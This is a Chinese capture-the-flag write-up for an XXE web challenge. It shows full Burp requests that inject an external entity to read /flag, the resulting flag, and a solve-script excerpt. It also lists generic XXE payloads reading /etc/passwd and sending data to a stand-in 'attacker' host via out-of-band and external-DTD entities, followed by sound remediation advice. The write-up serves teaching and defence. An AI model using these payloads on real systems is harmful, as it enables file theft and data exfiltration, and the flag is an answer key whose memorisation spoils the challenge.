# 第 404 号漂流瓶 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / XXE（XML 外部实体注入） |
| 分值 | 1000 |
| 类型 | DynamicContainer |
| 入口 | `http://103.163.47.230:33698`（复现容器） |
| Flag | `HTUCTF{479694e0-68f3-49c6-853a-85d48a59954d}` |
| 复现脚本 | `solve_xxe.py` |

## 1. 题目与指纹

页面是"深海邮局 · 第 404 号漂流瓶"，只有一个 XML 编辑框和一个预览区。底部明确写着：

```html
<p><span class="key">POST</span> /api/preview <i></i> 仅接收 application/xml</p>
...
<!-- Nautilus Parser supports legacy DTD documents. -->
```

这行 HTML 注释就是唯一的明示线索：**解析器支持 legacy DTD**（即 DOCTYPE / 外部实体）。

前端 `app.js` 里能确认接口的调用方式：

```js
const response = await fetch("/api/preview", {
  method: "POST",
  headers: { "Content-Type": "application/xml; charset=utf-8" },
  body: input.value,     // 用户完全可控的 XML 原文
});
const data = await response.json();
```

用户输入整段 XML 直接进解析器，返回值是 JSON，且把 `sender / receiver / message` 原样回显
—— 这是一个标准的**回显式 XXE**，不需要 OOB 外带。

## 2. Burp 复现（完整请求报文）

> 换容器时只需要把下面报文里的 `Host` 换成新的 `IP:PORT`，其余不动。
> 报文可直接粘贴进 **Burp Repeater** 的请求编辑区（`Ctrl+R` 发送到 Repeater 后整段覆盖即可）。

### 2.1 先发一个正常请求，摸清返回结构

打开页面 → 在编辑框里随便写点东西点预览 → Burp **Proxy → HTTP history** 里找到
`POST /api/preview` → 右键 **Send to Repeater**。在 Repeater 里把 body 改成：

```http
POST /api/preview HTTP/1.1
Host: 103.163.47.230:33698
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Content-Type: application/xml; charset=utf-8
Content-Length: 113
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<letter><sender>anon</sender><receiver>post</receiver><message>hi</message></letter>
```

点 **Send**，右侧 Response：

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"classified":false,"message":"hi","receiver":"post","sender":"anon"}
```

三个字段都被原样回显，任选一个当外带通道即可（下面用 `sender`）。

> ⚠️ 粘贴进 Repeater 后，如果用 **"Update Content-Length"** 不方便，
> 可以勾选 Repeater 右上角的齿轮 → *Update Content-Length*，或直接在
> **Proxy → Options** 里勾上自动更新，避免长度不对导致服务端读不满 body。

### 2.2 注入外部实体读 `/flag`

题面说得很直白：

> 它没有编号，没有寄件人，也没有躺进任何一格档案柜，它只在服务器的根目录下，留了一道薄薄的影子。
> 让解析器替你潜下去，把它捞起来。

根目录下那道"影子"就是 `/flag`。把 Repeater 里的 body 换成：

```http
POST /api/preview HTTP/1.1
Host: 103.163.47.230:33698
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Content-Type: application/xml; charset=utf-8
Content-Length: 189
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE letter [<!ENTITY xxe SYSTEM "file:///flag">]>
<letter><sender>&xxe;</sender><receiver>post</receiver><message>hi</message></letter>
```

**Send** → Response：

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"classified":false,"message":"hi","receiver":"post","sender":"HTUCTF{479694e0-68f3-49c6-853a-85d48a59954d}"}
```

`&xxe;` 在解析阶段就被替换成了 `/flag` 的内容，直接躺在 `sender` 字段里。

### 2.3 也可以用 Burp 的 Intruder / 命令行等价物

不想手动拼报文时，`solve_xxe.py` 只是下面这段的自动化版本（发的是**完全相同**的请求）：

```python
urllib.request.Request(BASE + "/api/preview", data=xxe.encode(),
                       headers={"Content-Type": "application/xml"}, method="POST")
```

## 5. 知识点

**XXE 的成因**：XML 规范允许在 DTD 中声明*外部实体*，`SYSTEM "file:///flag"` 会让解析器在展开
`&xxe;` 时去读本地文件（也支持 `http://`、`php://` 等协议）。只要解析器开了外部实体解析，
且把解析结果回显（或能通过报错/OOB 外带）到响应里，就是任意文件读。

Python 侧对应的是 `lxml.etree`：`etree.XMLParser()` 默认 `resolve_entities=True`，
`etree.fromstring(user_xml)` 就会中招；`xml.etree.ElementTree` 默认不解析外部实体，
`defusedxml` 则是专门的加固库。

通用利用三件套：

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">                       <!-- 读文件 -->
<!ENTITY xxe SYSTEM "http://attacker/?d=%file;">                 <!-- 带外(OOB) -->
<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> %dtd;          <!-- 外部 DTD，绕过回显限制 -->
```

## 6. 踩过的坑

- **目录不能列**：`file:///`（指向根目录）时服务端返回
  `{"error":"漂流瓶在下潜途中破裂了：信件格式无法识别。"}` —— 目录列表不是合法 XML，
  解析直接抛错。**XXE 的 `file://` 只能读文件，不能列目录**。
- **Content-Type 必须带**：接口只接收 `application/xml`，用表单提交会被拒。
- **别用 `&` 硬拼**：实体引用必须写在元素文本里（`<sender>&xxe;</sender>`），
  写在属性值里同样可用，但本题返回结构只有这三个字段，放元素里最省事。

## 7. 修复建议

```python
from defusedxml.lxml import fromstring          # 或直接 defusedxml.ElementTree
# 或者手工关掉实体解析：
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
tree = etree.fromstring(user_xml, parser)
```

- 使用 `defusedxml`，或显式 `resolve_entities=False`
- 关闭 DTD：`XMLConstants.FEATURE_SECURE_PROCESSING`（Java 侧同理）
- 业务上根本不需要 DTD 时，直接禁止 `<!DOCTYPE`（本题页面注释等于自曝其短）
- 出网限制：禁掉解析器的网络访问，阻断 OOB 型 XXE
